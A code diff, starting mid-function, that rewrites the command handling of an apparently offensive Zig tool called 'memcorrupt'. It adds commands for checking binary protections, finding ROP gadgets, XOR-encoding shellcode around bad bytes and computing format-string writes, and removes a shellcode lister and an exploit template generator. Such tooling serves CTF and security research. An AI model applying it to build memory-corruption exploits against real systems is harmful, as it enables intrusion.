+    } else if (mem.eql(u8, cmd, "gadgets") and args.len >= 3) {
+        try gadgetsCmd(alloc, args[2]);
+    } else if (mem.eql(u8, cmd, "encode") and args.len >= 3) {
+        try encodeCmd(alloc, args[2]);
+    } else if (mem.eql(u8, cmd, "fmtstr") and args.len >= 4) {
+        try fmtstrCmd(args);
+    } else {
+        printUsage();
+    }
 }
 
 fn printUsage() void {
-    const stdout = io.getStdOut().writer();
-    stdout.print(
-        \\
+    std.debug.print(
         \\USAGE:
         \\    memcorrupt <command> [options]
         \\
         \\COMMANDS:
-        \\    gadgets     Find ROP/JOP gadgets in binary
-        \\    checksec    Analyze binary protections
-        \\    template    Generate exploit template
-        \\    fmtstr      Format string calculator
-        \\    shellcode   Generate/encode shellcode
-        \\
-        \\OPTIONS:
-        \\    -f, --file      Target binary file
-        \\    -t, --type      Exploit type (stack_bof, format_string, heap)
-        \\    -o, --output    Output file
-        \\    --offset        Format string offset
-        \\    --target        Target address (hex)
-        \\    --value         Value to write (hex)
+        \\    checksec <binary>           Analyze binary protections
+        \\    gadgets <binary>            Find ROP gadgets  
+        \\    encode <shellcode_hex>      XOR encode shellcode
+        \\    fmtstr <addr> <value>       Format string calculator
         \\
         \\EXAMPLES:
-        \\    memcorrupt gadgets -f ./vuln
-        \\    memcorrupt checksec -f ./vuln
-        \\    memcorrupt template -t stack_bof -o exploit.zig
-        \\    memcorrupt fmtstr --offset 6 --target 0x404040 --value 0xdeadbeef
+        \\    memcorrupt checksec /bin/ls
+        \\    memcorrupt gadgets ./vulnerable
+        \\    memcorrupt encode 4831c050...
+        \\    memcorrupt fmtstr 0x601020 0x4141414141414141
         \\
-    , .{}) catch {};
+    , .{});
 }
 
-pub fn main() !void {
-    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
-    defer _ = gpa.deinit();
-    const allocator = gpa.allocator();
-
-    const stdout = io.getStdOut().writer();
-    try stdout.print("{s}{s}\n", .{ BANNER, VERSION });
-
-    var args = try process.argsWithAllocator(allocator);
-    defer args.deinit();
-
-    _ = args.skip(); // Skip program name
-
-    const command = args.next() orelse {
-        printUsage();
+fn checksecCmd(path: []const u8) !void {
+    std.debug.print("[*] Analyzing: {s}\n", .{path});
+    
+    const file = fs.cwd().openFile(path, .{}) catch |e| {
+        std.debug.print("[!] Error: {}\n", .{e});
         return;
     };
+    defer file.close();
 
-    if (mem.eql(u8, command, "gadgets")) {
-        var file_path: ?[]const u8 = null;
-
-        while (args.next()) |arg| {
-            if (mem.eql(u8, arg, "-f") or mem.eql(u8, arg, "--file")) {
-                file_path = args.next();
-            }
-        }
-
-        if (file_path) |path| {
-            try stdout.print("[*] Searching for gadgets in: {s}\n\n", .{path});
-            const gadgets = try findGadgets(path, allocator);
-            defer gadgets.deinit();
-
-            try stdout.print("=== Found {d} Gadgets ===\n\n", .{gadgets.items.len});
-            for (gadgets.items) |gadget| {
-                try stdout.print("  0x{x:0>8}: {s}\n", .{ gadget.address, gadget.disasm });
-            }
-        } else {
-            try stdout.print("[!] Please specify a file with -f\n", .{});
-        }
-    } else if (mem.eql(u8, command, "checksec")) {
-        var file_path: ?[]const u8 = null;
-
-        while (args.next()) |arg| {
-            if (mem.eql(u8, arg, "-f") or mem.eql(u8, arg, "--file")) {
-                file_path = args.next();
-            }
-        }
-
-        if (file_path) |path| {
-            try stdout.print("[*] Analyzing: {s}\n", .{path});
-            const prot = checksec(path) catch |err| {
-                try stdout.print("[!] Error: {}\n", .{err});
-                return;
-            };
-            printProtections(prot);
-        } else {
-            try stdout.print("[!] Please specify a file with -f\n", .{});
-        }
-    } else if (mem.eql(u8, command, "template")) {
-        var exploit_type: []const u8 = "stack_bof";
-        var output: []const u8 = "exploit.zig";
-
-        while (args.next()) |arg| {
-            if (mem.eql(u8, arg, "-t") or mem.eql(u8, arg, "--type")) {
-                exploit_type = args.next() orelse "stack_bof";
-            } else if (mem.eql(u8, arg, "-o") or mem.eql(u8, arg, "--output")) {
-                output = args.next() orelse "exploit.zig";
-            }
-        }
-
-        try generateTemplate(exploit_type, output);
-        try stdout.print("[+] Template generated: {s}\n", .{output});
-    } else if (mem.eql(u8, command, "shellcode")) {
-        try stdout.print("[*] Available shellcodes:\n\n", .{});
-        try stdout.print("  execve_binsh ({d} bytes):\n    ", .{Shellcode.execve_binsh.len});
-        for (Shellcode.execve_binsh) |byte| {
-            try stdout.print("\\x{x:0>2}", .{byte});
-        }
-        try stdout.print("\n\n", .{});
-    } else if (mem.eql(u8, command, "-h") or mem.eql(u8, command, "--help")) {
-        printUsage();
-    } else {
-        try stdout.print("[!] Unknown command: {s}\n", .{command});
-        printUsage();
+    const stat = try file.stat();
+    if (stat.size > MAX_FILE_SIZE) {
+        std.debug.print("[!] File too large\n", .{});
+        return;
     }
+
+    var buf: [MAX_FILE_SIZE]u8 = undefined;
+    const n = try file.readAll(&buf);
+
+    var parser = ElfParser.init(buf[0..n]);
+    try parser.validate();
+    
+    const features = try parser.getSecurityFeatures();
+    features.display();
+}
+
+fn gadgetsCmd(alloc: Allocator, path: []const u8) !void {
+    std.debug.print("[*] Scanning: {s}\n", .{path});
+    
+    const file = fs.cwd().openFile(path, .{}) catch |e| {
+        std.debug.print("[!] Error: {}\n", .{e});
+        return;
+    };
+    defer file.close();
+
+    var buf: [MAX_FILE_SIZE]u8 = undefined;
+    const n = try file.readAll(&buf);
+
+    var finder = GadgetFinder.init(alloc, buf[0..n], 0x400000);
+    defer finder.deinit();
+    
+    try finder.scan();
+    finder.display(50);
+}
+
+fn encodeCmd(alloc: Allocator, hex: []const u8) !void {
+    if (hex.len % 2 != 0) {
+        std.debug.print("[!] Invalid hex length\n", .{});
+        return;
+    }
+
+    const sc = try alloc.alloc(u8, hex.len / 2);
+    defer alloc.free(sc);
+
+    var i: usize = 0;
+    while (i < hex.len) : (i += 2) {
+        sc[i / 2] = std.fmt.parseInt(u8, hex[i .. i + 2], 16) catch {
+            std.debug.print("[!] Invalid hex at {d}\n", .{i});
+            return;
+        };
+    }
+
+    const bad = &[_]u8{ 0x00, 0x0a, 0x0d };
+    const encoder = ShellcodeEncoder.init(bad);
+    
+    const result = try encoder.xorEncode(alloc, sc);
+    defer alloc.free(result.data);
+    
+    result.display();
+}
+
+fn fmtstrCmd(args: [][]u8) !void {
+    const target = std.fmt.parseInt(u64, args[2], 0) catch {
+        std.debug.print("[!] Invalid target\n", .{});
+        return;
+    };
+    
+    const value = std.fmt.parseInt(u64, args[3], 0) catch {
+        std.debug.print("[!] Invalid value\n", .{});
+        return;
+    };
+    
+    const offset: u32 = if (args.len > 4) 
+        std.fmt.parseInt(u32, args[4], 10) catch 6 
+    else 6;
+
+    const calc = FmtStrCalc{ .target = target, .value = value, .offset = offset };
+    calc.calculate();
 }
